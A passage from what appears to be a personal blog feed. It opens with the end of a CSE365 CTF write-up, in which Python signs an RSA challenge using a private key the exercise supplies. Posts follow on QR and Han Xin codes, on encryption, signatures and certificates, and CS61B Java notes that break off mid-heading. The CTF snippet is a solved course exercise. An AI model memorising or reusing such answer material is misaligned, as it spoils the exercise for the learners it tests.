class="number">0xc177fb1ea71d946c909123a4ec45cd845d67bf5dd88730832cf5eabce7d5402bc3d4f95d5c7d7b198191b21d9dc138a293005ed68f955d608c95257557aa82ddc3477fb151acac90ff86cfcc9f9a0b197601457505ae9f25db50a62e26937319905e4a268dfdfbebf89ad07a59311eb00e791841f063165c2c107ffbec38f741b6a679ec96fe1f9a247b8428391e3ab5721750b1686e73d6d5835c52f9cfbb50853c2699741061a57b8a88bcdb20db9324386c8c97bbca564febdc353158eabab2334423733f38ef7dfe95edbb1bf195f0440edd81f87143c2f29be9431b0cc3012b7b8cbe7deff92abb858a8d4ec62fe056b2d1633aaf93622780610625a451</span></span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">d = <span class="number">0x26a10bb97f99a6e0946efe64782ea9cde38e8b05b46dadd08b4220d80e1c24bf784f06694f45d8b5eb8a893b639bc870a19461db4a7902d77bca6ddbc3a0ce9773ddcb4fbee490e234bb18b39d2c7749e2a7775459c9978a4a038ce2cb1e06cdd467173c227ed375b6c2469d1f40f1052b269fa2ceda22054e610f04e09231400b0da57b4d6be1eda7bfd6b16329a53ac93be634b509b07eae1a732faf13873401ed400bad1a3b69dfc78854e8c930bfcf2c1199b30b56341be8a35aa5e5feab42711d102263cb9951e60f7b8b4b9559616ed88972c353e7dd7772cd6d66b52b94449c0471ad9f7444259dbaef117895e13870ccebff30cf29502482f2c422ff</span></span><br><span class="line">challenge = <span class="number">0x253f10636b285fd622841c813fdaf012cc23380388f78c6da0e1671d784046dc576c1efcfd60e9286e563fb54ea595a1e083fff430bf58fdaa428d01da75b4109f735cd21b88619bc4d4a79698e9c33599fd7968232b1c0e33f2b23a4800d78d265d7eccc19bc6835087942664d147474ff6b4a30766ba6ff2e122176a3ef866c60f94731f54d867f7ebff089d6517bfb96d9246569880a290f1da2567b4b5cc2c8f96785783f13b6b346b6f10e18aa2fe0d461d3bceb286014acb31bb6f698fc25e80b26cbfa48dd105f1632e6fc62ad255363b26c3c0a8dcd8cc6da27cc2b83ab75aaac9ae5d1189ae93547985af1e769f7f8dcfc7f77611f001e56720ca96</span></span><br><span class="line"></span><br><span class="line">response = <span class="built_in">pow</span>(challenge, d, n).to_bytes(<span class="number">256</span>, <span class="string">"big"</span>).<span class="built_in">hex</span>() <span class="comment">#这题与字节顺序无关</span></span><br><span class="line"><span class="built_in">print</span>(response)</span><br></pre></td></tr></tbody></table></figure></li><li><p>level12：</p></li></ul>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>CSE365</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>CSE365</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>二维码和汉信码</title>
    <link href="/2024/08/29/%E4%BA%8C%E7%BB%B4%E7%A0%81%E5%92%8C%E6%B1%89%E4%BF%A1%E7%A0%81/"/>
    <url>/2024/08/29/%E4%BA%8C%E7%BB%B4%E7%A0%81%E5%92%8C%E6%B1%89%E4%BF%A1%E7%A0%81/</url>
    
    <content type="html"><![CDATA[<h3 id="qr-code二维码">QR Code（二维码）</h3><ul><li><p>起源：QR码最早由日本公司DensoWave在1994年发明，用于追踪汽车零部件。</p></li><li><p>特点：</p><ul><li><strong>信息容量</strong>：QR码可以存储大量信息，包括文字、网址、甚至二进制数据。标准的QR码可以存储大约7,000个字符的数字数据或4,300个字母数字字符。</li><li><strong>纠错能力</strong>：QR码具有四级纠错能力，可以在部分破损的情况下仍然被解码。</li><li><strong>结构</strong>：QR码由黑白方格组成，形成一个方形矩阵，可以通过相机快速扫描识别。</li><li><strong>应用</strong>：广泛应用于商业、支付、广告、产品追踪等领域。</li></ul><p><img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20240829092401716.png" alt="image-20240829092401716" style="zoom: 33%;"></p></li></ul><h3 id="han-xin-code汉信码">Han Xin Code（汉信码）</h3><ul><li><p>起源：汉信码是由中国国家标准化管理委员会于2007年发布的一种二维条码，它特别适用于中文信息的编码和存储。</p></li><li><p>特点：</p><ul><li><strong>信息容量</strong>：汉信码特别设计用于存储汉字、日文假名、韩文、以及其他多种字符集。它可以容纳更多的汉字信息，比QR码更适合中文等东亚语言的编码。</li><li><strong>纠错能力</strong>：汉信码也具有纠错功能，具体的纠错能力取决于编码的级别和需求。</li><li><strong>结构</strong>：与QR码相似，汉信码也是一个二维的矩阵结构，不过它的结构更加灵活，以适应不同字符集的编码需求。</li><li><strong>应用</strong>：汉信码在中国的物流、零售、以及公共服务领域得到了应用，特别是需要处理大量中文信息的场景。</li></ul><p><img src="https://barcode.tec-it.com/barcode.ashx?data=%E6%B1%89%E4%BF%A1%E7%A0%81&amp;code=HanXin" style="zoom: 200%;"></p></li></ul>]]></content>
    
    
    <categories>
      
      <category>编码</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Misc</tag>
      
      <tag>编码</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>加密-数字签名-数字证书</title>
    <link href="/2024/08/06/%E5%8A%A0%E5%AF%86-%E7%AD%BE%E5%90%8D-%E8%AF%81%E4%B9%A6/"/>
    <url>/2024/08/06/%E5%8A%A0%E5%AF%86-%E7%AD%BE%E5%90%8D-%E8%AF%81%E4%B9%A6/</url>
    
    <content type="html"><![CDATA[<h2 id="加密">加密</h2><p>可分为：</p><ul><li>对称加密</li><li>非对称加密</li></ul><h3 id="对称加密">对称加密</h3><p>同一个密钥可以同时用作信息的加密和解密。</p><p>常见的对称加密算法有：</p><ul><li><strong>AES</strong>：https://ctf-wiki.org/crypto/blockcipher/aes/</li><li>DES：分组加密算法，它将数据分成64位的块进行加密。</li><li>RC：RC算法家族包括RC2、RC4、RC5、RC6等</li></ul><h4 id="分组模式">分组模式</h4><p><strong>电子密码本模式（ECB - Electronic CodebookMode）</strong>：</p><ul><li>每个明文分组独立加密为相应的密文分组。</li><li>不推荐用于实际应用，因为相同的明文分组总是加密为相同的密文分组，导致模式泄露。</li></ul><p><strong>密码分组链接模式（CBC - Cipher Block ChainingMode）</strong>：</p><ul><li>每个明文分组在加密前与前一个密文分组进行异或操作。</li><li>需要一个初始向量（IV）来加密第一个分组。</li><li>增强了安全性，避免了相同的明文分组生成相同的密文分组。</li></ul><p><strong>计数器模式（CTR - Counter Mode）</strong>：</p><ul><li>将一个计数器值加密，然后将结果与明文分组进行异或操作。</li><li>计数器值每次加密时递增。</li><li>支持并行处理，提高加密速度。</li><li>也可用于流密码。</li></ul><p><strong>加密反馈模式（CFB - Cipher Feedback Mode）</strong>：</p><ul><li>类似于流密码，每个明文分组通过异或操作与加密的前一个密文分组进行加密。</li><li>需要一个初始向量（IV）。</li><li>适用于逐字节加密或逐位加密。</li></ul><p><strong>输出反馈模式（OFB - Output Feedback Mode）</strong>：</p><ul><li>类似于流密码，每个明文分组通过异或操作与一个加密的种子值进行加密，该种子值从初始向量（IV）开始，然后每次通过加密函数递归生成。</li><li>不同于CFB模式，OFB模式不依赖于前一个密文分组，因此加密过程可以提前进行。</li></ul><p><strong>Galois/Counter Mode（GCM）</strong>：</p><ul><li>结合了计数器模式和一个认证机制。</li><li>提供数据完整性和保密性。</li></ul><h4 id="缺点">缺点</h4><ul><li>在对称加密中，加密和解密使用相同的密钥。因此，如何安全地分发密钥是一个重大挑战。如果密钥在传输过程中被截获或泄露，整个加密系统的安全性将受到严重威胁。</li><li>对称加密无法提供非否认性，即无法证明一条消息确实是由某个特定用户发送的。因为加密和解密使用相同的密钥，任何拥有该密钥的人都可以加密和解密消息，因此无法区分消息的发送者。</li><li>对称加密需要一个安全的初始密钥交换机制。如果没有合适的密钥交换协议，初始密钥交换会成为系统的薄弱环节，容易受到攻击。</li></ul><h3 id="非对称加密">非对称加密</h3><p>使用一对密钥进行加密和解密操作。这对密钥包括一个公钥（PublicKey）和一个私钥（Private Key）。其中：</p><ul><li><p><strong>公钥</strong>：可以公开分发，用于<strong>加密</strong>数据。</p></li><li><p><strong>私钥</strong>：必须保密，用于<strong>解密</strong>数据。</p></li></ul><p>常见的非对称加密算法：</p><ul><li><strong>RSA</strong>：https://ctf-wiki.org/crypto/asymmetric/rsa/rsa_theory/</li><li>ECC:基于椭圆曲线离散对数问题，提供相同安全级别所需的密钥长度比RSA短，因此效率更高</li><li>DSA：主要用于数字签名，基于离散对数问题。</li></ul><h4 id="问题">问题</h4><p>非对称加密能够一定程度上消除对称加密出现的安全问题，但是假如公钥被中间人拦截并篡改了呢？这就涉及到了数字签名和数字证书。</p><h2 id="数字签名">数字签名</h2><p><strong>数字签名</strong>是一种用于验证数字信息完整性、真实性和不可否认性的技术。它通过使用非对称加密算法，确保数据在传输过程中没有被篡改，<strong>并确认数据的发送者身份</strong>。数字签名是用<strong>私钥</strong>生成的</p><ol type="1"><li><p><strong>生成哈希值</strong>：对要签名的数据进行哈希运算，生成固定长度的哈希值。</p></li><li><p><strong>加密哈希值</strong>：使用发送者的私钥对生成的哈希值进行加密，生成数字签名。</p></li><li><p><strong>附加签名</strong>：将数字签名附加到数据后面，一并发送给接收方。</p></li></ol><h2 id="数字证书">数字证书</h2><p><strong>数字证书</strong>是由权威机构（证书颁发机构，CA）签发的一种电子文档，用来<strong>验证公开密钥的真实性</strong>。它包含了公钥和持有者信息，并且由CA的<strong>私钥</strong>签名，确保证书的可信性。</p><ol type="1"><li><p><strong>生成密钥对</strong>：申请者生成一对公钥和私钥，并向CA提交公钥和身份信息。</p></li><li><p><strong>CA验证信息</strong>：CA验证申请者的身份信息。</p></li><li><p><strong>签发证书</strong>：CA用其<strong>私钥</strong>对申请者的公钥和身份信息进行签名，生成数字证书，并将证书发给申请者。</p></li><li><p><strong>发布和使用</strong>：申请者将数字证书与公钥一起提供给需要验证其身份的各方。</p></li></ol><h2 id="示例">示例</h2><p>Alice 和 Bob 的安全通信：</p><ol type="1"><li>Alice 申请数字证书<ul><li>Alice 向证书颁发机构 (CA) 申请数字证书。</li><li>Alice 生成了一对公钥和私钥，并将公钥和个人身份信息发送给 CA。</li><li>CA 验证 Alice 的身份信息。</li><li>CA 用自己的私钥对 Alice 的公钥和身份信息进行签名，生成 Alice的<strong>数字证书</strong>，并将证书发送给 Alice。</li></ul></li><li>Alice 发送带签名的消息给 Bob<ul><li>Alice使用她的私钥对消息进行签名，生成<strong>数字签名</strong>。</li><li>Alice 将消息和数字签名一起发送给 Bob，同时附上她的数字证书。</li></ul></li><li>Bob 验证 Alice 的数字签名和证书<ul><li>Bob 收到消息、数字签名和 Alice 的数字证书。</li><li>Bob 使用 CA 的公钥验证 Alice 的数字证书，确认证书是由可信的 CA签发的，并且证书中的公钥确实属于 Alice。</li><li>Bob 提取 Alice 的公钥，用它来验证 Alice的数字签名，确保消息没有被篡改，并确认消息确实是由 Alice 发送的。</li></ul></li></ol><blockquote><p>在数字签名中，公钥和私钥是成对使用的。私钥用于加密（签名），公钥用于解密（验证）。虽然公钥通常用于解密加密的数据，但在数字签名的场景中，它的作用是验证签名是否有效。</p></blockquote><p>参考：https://segmentfault.com/a/1190000024523772</p>]]></content>
    
    
    <categories>
      
      <category>信息安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>信息安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CS61B知识点</title>
    <link href="/2024/07/08/CS61B/"/>
    <url>/2024/07/08/CS61B/</url>
    
    <content type="html"><![CDATA[<p>CS61B一直学得断断续续的，学起来没啥动力，最近做到了lab4，有点做不下去了，准备先去学习CSE365。下面是学过的知识点。</p><h2 id="lab2">Lab2</h2><h3 id="junit">JUnit</h3><p>https://sp21.datastructur.es/materials/lab/lab2/lab2</p><p>test函数都是非静态的，如下：</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">testMethod</span><span class="params">()</span> {</span><br><span class="line">    assertEquals(&lt;expected&gt;, &lt;actual&gt;);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="嵌套类">嵌套类</h3><p>https://zq99299.github.io/java-tutorial/java/javaoo/nested.html</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">OuterClass</span> {</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">NestedClass</span> {</span><br><span class="line">        ...</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>嵌套类分为<strong>静态</strong>和<strong>非静态</strong></p><p>嵌套类是其封闭类的成员。非静态嵌套类（内部类）可以访问封闭类的其他成员，即使它们被声明为私有的。静态嵌套类无法访问封闭类的其他成员</p><blockquote><p>外部类只能被声明 public 或包私有</p></blockquote><h3 id="相同类名的函数">相同类名的函数</h3><p>Java中允许出现相同类名的函数，只要参数个数不同就能区分</p><p>属于<strong>重载</strong>（overload）</p><h3 id="泛型">泛型</h3><p>在类的后面使用尖括号，尖括号内为占位符，在定义具体对象时，占位符可替换为具体的类型。如下：</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DLList</span>&lt;BleepBlorp&gt; {</span><br><span class="line">    <span class="keyword">private</span> IntNode sentinel;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> size;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">IntNode</span> {</span><br><span class="line">        <span class="keyword">public</span> IntNode prev;</span><br><span class="line">        <span class="keyword">public</span> BleepBlorp item;</span><br><span class="line">        <span class="keyword">public</span> IntNode next;</span><br><span class="line">        ...</span><br><span class="line">    }</span><br><span class="line">    ...</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DLList&lt;String&gt; d2 = <span class="keyword">new</span> <span class="title class_">DLList</span>&lt;&gt;(<span class="string">"hello"</span>); <span class="comment">//第二个尖括号可为空</span></span><br></pre></td></tr></tbody></table></figure><p>由于<strong>泛型</strong>只适用于<strong>引用类型</strong>，我们不能将int或double等基元放在尖括号内，相反，我们使用基元类型的引用版本，在若对象为int类型的情况下，代码应该为:</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DLList&lt;Integer&gt; d = <span class="keyword">new</span> <span class="title class_">DLList</span>&lt;&gt;(<span class="number">2</span>);</span><br></pre></td></tr></tbody></table></figure><blockquote><p>相关类型还有：<code>Integer</code>, <code>Double</code>,<code>Character</code>, <code>Boolean</code>, <code>Long</code>,<code>Short</code>, <code>Byte</code>, <code>Float</code></p></blockquote><h3 id="包package">包（Package）</h3><p>包是Java类的集合，所有这些类一起工作以实现某个共同的目标</p><p>同一个包的类，代码顶部会有一行：</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> &lt;package_name&gt;;</span><br></pre></td></tr></tbody></table></figure><h2 id="section">2.4</h2><h3 id="数组array">数组（Array）</h3><p>定义数组方式如下：</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span>[] x = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">3</span>]; <span class="comment">//用默认的int值0填充3个元素</span></span><br><span class="line"><span class="type">int</span>[] y = <span class="keyword">new</span> <span class="title class_">int</span>[]{<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>};</span><br><span class="line"><span class="type">int</span>[] z = {<span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>};</span><br></pre></td></tr></tbody></table></figure><p>复制数组的方法如下：</p><ul><li><code>System.arraycopy(a, 0, b, 3, 2)</code>：该函数用于数组复制，5个参数分别是——源数组、开始索引、目标数组、(目标数组的)开始索引、(要复制的)元素个数，类似于Python的<code>b[3:5] = a[0:2]</code></li><li>使用循环，依次赋值</li></ul><h3 id="泛型数组初始化">泛型数组初始化</h3><p>Java中不允许使用泛型数组，即下面的语句是错误的：</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Item[] a = <span class="keyword">new</span> <span class="title class_">Item</span>[last*<span class="number">2</span>];</span><br></pre></td></tr></tbody></table></figure><p>应该修改为：</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Item[] a = (Item[]) <span class="keyword">new</span> <span class="title class_">Object</span>[last*<span class="number">2</span>];  <span class="comment">//命令行编译的话会有warning，忽略即可</span></span><br></pre></td></tr></tbody></table></figure><h2 id="lab3">Lab3</h2><p>debug模式下，首先点击<code>step over</code>，然后点击<code>Resume</code>按钮，程序会再次运行到当前断点（相当于多次<code>step over</code>）</p><p>右击断点会弹出窗口，可设置条件，再次点击<code>Resume</code>，程序会运行到满足条件才停下运行</p><h2 id="proj1-part1">Proj1 part1</h2><h4 id="双链表double-linkded-list">双链表（double linkded list）</h4><figure><img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20240624093831743.png" alt="image-20240624093831743"><figcaption aria-hidden="true">image-20240624093831743</figcaption></figure><p>在两端设置<code>first</code>和<code>last</code>节点，方便操作</p><h4 id="数组队列">数组队列</h4><p>这里用到了循环队列的思想，使用<code>first</code>和<code>last</code>表示队头和队尾的数组下标，且这个两个下标对应的数组元素不存放数据。</p><ul><li><p>队空：</p><p><img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20240624112915630.png" alt="image-20240624112915630" style="zoom:80%;"></p></li><li><p>插入一个元素</p><p><img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20240624112938798.png" alt="image-20240624112938798" style="zoom:80%;"></p></li><li><p>队满</p><p><img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20240624113008932.png" alt="image-20240624113008932" style="zoom:80%;"></p></li></ul><h2 id="section-1">4.1</h2><h3 id="method-overloading方法重载">method overloading（方法重载）</h3><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">longest</span><span class="params">(SLList&lt;String&gt; list)</span> {</span><br><span class="line">    ...</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">longest</span><span class="params">(AList&lt;String&gt; list)</span> {</span><br><span class="line">    ...</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><blockquote><p>缺点：代码重复</p></blockquote><h3 id="接口interface">接口（interface）</h3><p>参考：https://blog.csdn.net/Warpar/article/details/72859529</p><p><img src="https://joshhug.gitbooks.io/hug61b/content/assets/subclass.png"></p><p>将<code>List61B</code>定义为一个接口<code>interface</code>，接口中的<strong>方法为空</strong></p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">List61B</span>&lt;Item&gt; {</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addFirst</span><span class="params">(Item x)</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addLast</span><span class="params">(Item y)</span>;</span><br><span class="line">    <span class="keyword">public</span> Item <span class="title function_">getFirst</span><span class="params">()</span>;</span><br><span class="line">    <span class="keyword">public</span> Item <span class="title function_">getLast</span><span class="params">()</span>;</span><br><span class="line">    <span class="keyword">public</span> Item <span class="title function_">removeLast</span><span class="params">()</span>;</span><br><span class="line">    <span class="keyword">public</span> Item <span class="title function_">get</span><span class="params">(<span class="type">int</span> i)</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">insert</span><span class="params">(Item x, <span class="type">int</span> position)</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">size</span><span class="params">()</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><blockquote><ul><li><p>The interface includes all the method signatures, but notimplementations. It's up to the subclass to actually provide thoseimplementations.</p></li><li><p>接口中不使用 private ，无法调用，无意义</p></li></ul></blockquote><h3 id="method-overriding方法重写">Method Overriding（方法重写）</h3><p><strong>仅适用于继承</strong></p><p>当子类<code>AList</code>或<code>SLList</code>通过<code>implements</code>继承<code>List61B</code>接口，并在这两个<strong>子类中对方法进行重写</strong>，如下：</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AList</span>&lt;Item&gt; <span class="keyword">implements</span> <span class="title class_">List61B</span>&lt;Item&gt;{</span><br><span class="line">    ...</span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">//可省略</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addFirst</span><span class="params">(Item x)</span> {</span><br><span class="line">        ...</span><br><span class="line">    }</span><br><span class="line">    ...</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="interface-inheritance接口继承">InterfaceInheritance（接口继承）</h3><p><code>implements</code>的使用就是所谓的接口继承</p><h3 id="implementation-inheritance实现继承">ImplementationInheritance（实现继承）</h3><p>直接在接口中实现方法的主体(可以不用在子类中进行overriding)，使用<code>default</code>字段，实现<code>Implementation Inheritance</code></p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">List61B</span>&lt;Item&gt; {</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addFirst</span><span class="params">(Item x)</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addLast</span><span class="params">(Item y)</span>;</span><br><span class="line">    <span class="keyword">public</span> Item <span class="title function_">getFirst</span><span class="params">()</span>;</span><br><span class="line">    <span class="keyword">public</span> Item <span class="title function_">getLast</span><span class="params">()</span>;</span><br><span class="line">    <span class="keyword">public</span> Item <span class="title function_">removeLast</span><span class="params">()</span>;</span><br><span class="line">    <span class="keyword">public</span> Item <span class="title function_">get</span><span class="params">(<span class="type">int</span> i)</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">insert</span><span class="params">(Item x, <span class="type">int</span> position)</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">size</span><span class="params">()</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">default</span> <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">print</span><span class="params">()</span> {</span><br><span class="line">        ...</span><br><span class="line">}</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>所有<code>implements</code>该接口的子类均可直接调用<code>print()</code></p><p>上述的<code>List61B</code>是<strong>静态类型</strong>，子类为<strong>动态类型</strong>；<strong>动态方法选择</strong>（若子类重写了<code>print()</code>方法，则根据变量类型判断执行<code>List61B</code>中的<code>print()</code>方法或子类的）只发生在重写的情况下。（注意与重载的区别）</p><blockquote><p>两个继承的区别：</p><ul><li><p>实现继承是子类从基类继承行为实现的关系。</p></li><li><p>接口继承是指子类仅从基类继承行为描述并提供实现本身。</p></li></ul></blockquote><h2 id="section-2">4.2</h2><h3 id="extends">Extends</h3><p><code>implements</code>用于<strong>子类与接口</strong>之间，<code>extends</code>用于<strong>基类与子类</strong>之间。<code>extends</code>使得子类保留了基类的函数，同时还能在子类中修改继承的函数，还可以添加新的函数。</p><ul><li>子类无法访问基类的私有成员</li><li><strong>基类的构造函数无法被继承</strong></li><li>子类可以通过<code>super.method()</code>直接调用父类中<code>public</code>修饰的函数</li></ul><p>在 Java中，当子类的构造函数被调用时，会先调用父类的构造函数。如果父类没有<strong>无参数构造函数</strong>，那么必须在子类构造函数中显式调用父类的构造函数，并传递适当的参数。如下所示：</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">基类的构造函数有参数</span><br><span class="line"><span class="keyword">public</span> <span class="title function_">VengefulSLList</span><span class="params">(Item d)</span> {</span><br><span class="line">        <span class="built_in">super</span>(d);  <span class="comment">// 基类的构造函数为 SLList(Item d)</span></span><br><span class="line">        deletedItems = <span class="keyword">new</span> <span class="title class_">SLList</span>&lt;Item&gt;(); <span class="comment">// 存放被删除的数据</span></span><br><span class="line">}</span><br><span class="line"><span class="comment">// 上面两行代码创建了两个列表</span></span><br></pre></td></tr></tbody></table></figure><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">基类的构造函数无参数</span><br><span class="line"><span class="keyword">public</span> <span class="title function_">VengefulSLList</span><span class="params">()</span> {</span><br><span class="line">    <span class="comment">// super(); 可省略，java会自动调用基类的无参数构造函数</span></span><br><span class="line">    deletedItems = <span class="keyword">new</span> <span class="title class_">SLList</span>&lt;Item&gt;();</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="the-object-class">The Object Class</h3><p>每个Java类都是 Object 类的后代，或者说都是继承于 Object 类</p><h3 id="encapsulation封装">Encapsulation（封装）</h3><p>以<code>ALList</code>类为例，外部的函数只需要通过<code>ALList</code>类调用该类的方法即可，不需要理解该数据结构的细节。</p><p>注意在继承时，在子类中对基类方法进行重写，可能会破坏封装效果，如下：</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 基类</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">bark</span><span class="params">()</span> {</span><br><span class="line">    barkMany(<span class="number">1</span>);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">barkMany</span><span class="params">(<span class="type">int</span> N)</span> {</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; N; i += <span class="number">1</span>) {</span><br><span class="line">        System.out.println(<span class="string">"bark"</span>);</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 子类</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">barkMany</span><span class="params">(<span class="type">int</span> N)</span> {</span><br><span class="line">    System.out.println(<span class="string">"As a dog, I say: "</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; N; i += <span class="number">1</span>) {</span><br><span class="line">        bark();</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"><span class="comment">// 运行会陷入无限循环，一直相互调用</span></span><br></pre></td></tr></tbody></table></figure><h3 id="type-checking类型检查">Type 